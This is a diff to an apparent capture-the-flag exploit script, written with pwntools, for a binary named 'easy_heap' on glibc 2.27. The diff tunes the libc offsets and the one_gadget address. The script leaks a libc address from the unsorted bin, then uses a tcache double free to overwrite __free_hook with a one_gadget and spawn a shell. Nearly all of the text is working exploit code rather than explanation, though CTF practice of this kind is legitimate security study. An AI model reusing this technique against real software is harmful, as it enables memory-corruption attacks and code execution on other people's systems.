@@ -10,10 +10,10 @@ def debug_on():
 ld_name = "/glibc/2.27/64/lib/ld-2.27.so"
 g_fname = "./easy_heap"
 g_elf = ELF(g_fname)
-g_libcname =  "/glibc/2.27/64/lib/libc-2.27.so" if LOCAL else "./libc64.so"
+g_libcname =  "./libc64.so" if LOCAL else "./libc64.so"
 
 if (LOCAL):
-	g_io = process([ld_name, g_fname])
+	g_io = process([ld_name, g_fname], env={"LD_PRELOAD" : g_libcname})
 else:
 	g_io = remote()
 
@@ -90,10 +90,10 @@ def pwn():
 	# leak
 	show(0)
 	addr_ub = u64(rl()[:-1].ljust(8, b'\0'))
-	g_libc.address = addr_ub - 96 -  0x3afc40
-	off_one_gadget = 0xdeec2 if LOCAL else 0x4f2c5
+	g_libc.address = addr_ub - 96 -  0x3ebc40
+	off_one_gadget = 0xdeec2 if LOCAL else 0xdeec2
 	one_gadget = g_libc.address + off_one_gadget 
-	log.success("unsortedbin@%#x\nlibc@%#x\none_gadget@%#x", addr_ub, g_libc.address, one_gadget)
+	log.success("unsortedbin@%#x\nlibc@%#x\none_gadget@%#x\n__free_hook@%#x", addr_ub, g_libc.address, one_gadget, g_libc.symbols["__free_hook"])
 
 	# Part 2, tcache double free hijack __free_hook
 	getpid()
@@ -110,7 +110,7 @@ def pwn():
 	add(0x8, p64(g_libc.symbols["__free_hook"])) # idx=0
 	add(0x8, "none")		# idx=1
 	# cannot read '\x00', so only the first 6 bytes of one_gadget will be read.
-	# add(0x10, p64(one_gadget) + p64(g_libc.symbols["realloc"] + 2))
+	add(0x10, p64(one_gadget))
 
 	# trigger one_gadget
 	delete(1)
